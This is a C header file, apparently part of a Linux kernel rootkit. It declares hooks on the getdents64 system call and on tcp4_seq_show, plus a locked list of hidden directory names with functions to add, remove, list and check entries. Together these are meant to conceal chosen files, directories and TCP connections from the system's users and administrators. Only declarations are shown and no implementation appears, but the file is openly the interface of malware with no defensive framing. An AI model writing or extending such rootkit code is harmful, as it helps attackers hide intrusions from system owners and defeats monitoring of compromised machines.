#ifndef HIDE_H
#define HIDE_H

#include <linux/list.h>
#include <linux/spinlock.h>
#include <linux/ptrace.h>
#include <linux/types.h>
#include <linux/file.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/kernel.h>
#include <net/sock.h> 
#include <linux/seq_file.h>

struct linux_dirent64 {
    u64 d_ino;
    s64 d_off;
    unsigned short d_reclen;
    unsigned char d_type;
    char d_name[];
};

struct hidden_dir_entry {
    char *dirname;
    struct list_head list;
};

extern struct list_head hidden_dirs_list;
extern spinlock_t       hidden_dirs_lock;

extern asmlinkage int (*__orig_getdents64)(const struct pt_regs *regs);
extern asmlinkage long (*__orig_tcp4_seq_show)(struct seq_file *seq, void *v);
asmlinkage int getdents64_hook(const struct pt_regs *regs);
asmlinkage long tcp4_seq_show_hook(struct seq_file *seq, void *v);

int is_hidden(const char *name);
int add_hidden_dir(const char *dirname);
int remove_hidden_dir(const char *dirname);
int list_hidden_dirs(char *buf, size_t buf_size);

#endif // HIDE_H
